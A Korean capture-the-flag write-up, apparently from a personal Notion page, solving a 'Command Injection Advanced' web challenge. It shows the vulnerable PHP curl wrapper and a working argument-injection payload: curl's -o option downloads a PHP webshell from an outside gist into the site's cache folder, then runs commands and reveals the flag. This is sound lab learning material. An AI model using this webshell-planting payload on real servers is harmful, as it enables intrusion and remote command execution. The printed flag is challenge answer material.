https://teberr.notion.site/Command-Injection-Advanced-29ee9ae6563b43f19b4e08477eb75ec3

# 문제파일 다운로드

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7b467978-6f2b-4b42-8608-5ddd0551c35c/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

Command Injection Advanced 문제파일을 다운로드 받으면 도커파일과 index.php 파일이 존재한다.

# 코드 분석 및 공격 설계

```php
<html>
    <head></head>
    <link rel="stylesheet" href="/static/bulma.min.css" />
    <body>
        <div class="container card">
        <div class="card-content">
        <h1 class="title">Online Curl Request</h1>
    <?php
        if(isset($_GET['url'])){
            $url = $_GET['url'];
            if(strpos($url, 'http') !== 0 ){
                die('http only !');
            }else{
                $result = shell_exec('curl '. escapeshellcmd($_GET['url']));
                $cache_file = './cache/'.md5($url);
                file_put_contents($cache_file, $result);
                echo "<p>cache file: <a href='{$cache_file}'>{$cache_file}</a></p>";
                echo '<pre>'. htmlentities($result) .'</pre>';
                return;
            }
        }else{
        ?>
            <form>
                <div class="field">
                    <label class="label">URL</label>
                    <input class="input" type="text" placeholder="url" name="url" required>
                </div>
                <div class="control">
                    <input class="button is-success" type="submit" value="submit">
                </div>
            </form>
        <?php
        }
    ?>
        </div>
        </div>
    </body>
</html>
```

`<?php 내용 ?>` 부분을 천천히 살펴보면

1. url로 전달 받은 매개변수는 http로 시작해야 한다. 
2. 사용자가 입력한 매개변수 url에 담겨있는 값을 escapeshellcmd로 받아 curl로 실행시킨다.
3. 매개변수 url을 md5로 암호화한 값을 이름으로 하여 /cache/파일명 으로 결과값을 저장한다.

여기서 핵심은 escapeshellcmd 인데 이는 `메타 문자 . ^ $ * + ? { } [ ] \ | ( )`가 입력되었을 때 앞에 /를 삽입시켜 커맨드 인젝션을 방지해주는 함수이다. 이로 인해 메타문자를 이용한 커맨드 인젝션은 불가능하지만 사용자의 입력값이 특정 명령어의 ‘인자’로 전달되는 경우 그 명령어의 옵션(-기호 사용)은 조작할 수 있다.

이 때 문제에서 사용하고 있는 curl의 경우 전달된 URL에 접속하는 프로그램으로 -o 옵션을 사용하면 임의의 파일로 저장할 수 있다. 이를 이용해 웹쉘을 원하는 위치에 업로드할 수 있다.

웹쉘을 파일이 저장되는 ./cache/ 위치에 같이 올려보자.

# 공격

웹쉘을 올리기 위해서는 웹쉘 URI가 필요하다.

두가지 방법이 있는데 개인서버에 웹쉘파일을 올리고 그 웹쉘의 경로를 넣어주는 방법과 Github Raw file 링크를 이용하는 방법이 있다.

개인 서버를 여는 방법으로는 AWS를 사용하는데 이는 저번에 해봤듯 작업해야하는 것들이 조금 많아서 Github Raw file 링크를 이용하기로 했다.

[https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php](https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php) 은 웹쉘 php파일 URI이다.

![웹쉘.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a41fb768-e2d3-465b-ada6-89f4cd7dabb7/%EC%9B%B9%EC%89%98.png)

열어보면 cmd로 받은 매개변수를 system 함수로 실행시켜주는 것을 알 수 있다. 

![exploit.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/173da729-bc7a-4e43-9bd7-4b7b4f3dbf91/exploit.png)

![공격.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3925385d-4e50-40b1-9686-28f80d2853b1/%EA%B3%B5%EA%B2%A9.png)

이 웹쉘을 [https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php](https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php) -o /var/www/html/cache/exploit.php 로 하여 cache 폴더 밑에 웹쉘이 exploit.php 파일명으로 저장되도록 하였다.

![exploit.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f6cd7fcd-976e-409d-8cf8-67790603eef4/exploit.png)

그리고 /cache/exploit.php로 이동하면 위와 같이 창이 뜬다. 이제 이 창에 입력하고 Execute 버튼을 누르면 넣어준 값을 system함수에 넣어서 실행하게 된다.

![ls -al.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6f67349d-70da-4a20-a3c7-617fd17c8a63/ls_-al.png)

ls -al을 해주면 정상적으로 system(”ls -al”)의 결과가 나오는 것을 확인할 수 있다.

![ls -al root.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f97065d7-98f0-498e-9ab1-04e3e9ba83ae/ls_-al_root.png)

root 위치를 보면 flag 파일이 존재하고 실행권한만이 존재하는 것을 볼 수 있다.

이 flag 파일을 실행하면 flag 값이 나올 것이다.

![루트로 이동 후 flag 실행.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b4b2947a-bc00-4cbb-a1b7-485e5af76f4d/%EB%A3%A8%ED%8A%B8%EB%A1%9C_%EC%9D%B4%EB%8F%99_%ED%9B%84_flag_%EC%8B%A4%ED%96%89.png)

따라서 cd ../../../../../../로 루트로 이동 후 /flag를 실행하는 명령어를 파이프(|)로 연결하여 실행시킨다.

 

![flag.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b28d8786-3a03-4108-af54-d0733f0d4f50/flag.png)

flag 값 `DH{8ca5256a49452e4db9de7691a9c69b7678271383}`이 출력되는 것을 확인할 수 있다.
